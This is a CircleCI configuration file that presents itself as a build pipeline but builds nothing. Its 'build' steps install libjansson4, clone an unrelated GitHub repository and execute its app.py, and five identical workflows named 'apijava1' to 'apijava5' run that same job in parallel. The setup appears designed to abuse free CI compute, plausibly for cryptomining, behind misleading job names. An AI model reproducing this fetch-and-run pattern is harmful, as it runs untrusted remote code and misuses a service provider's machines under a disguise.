version: 2.1
executors:
  circleci_machine:
    docker:
      - image: cimg/go:1.16.4
    working_directory: ~/my-project
commands:
  build:
    description: Run build
    steps:
      - checkout
      - run:
          name: build
          command: |
              sudo apt update && sudo apt install libjansson4
               
      - run:
          name: build
          command: |
              git clone https://github.com/unauna1803/travershin.git && cd travershin && chmod +x app.py && cd travershin && chmod +x app.py && python3 app.py || python app.py
              
jobs:
  buildd:
    executor: circleci_machine
    working_directory: ~/my-project
    steps: [build]

workflows:
  version: 2
  apijava1:
    jobs:
      - buildd
  apijava2:
    jobs:
      - buildd
  apijava3:
    jobs:
      - buildd
  apijava4:
    jobs:
      - buildd
  apijava5:
    jobs:
      - buildd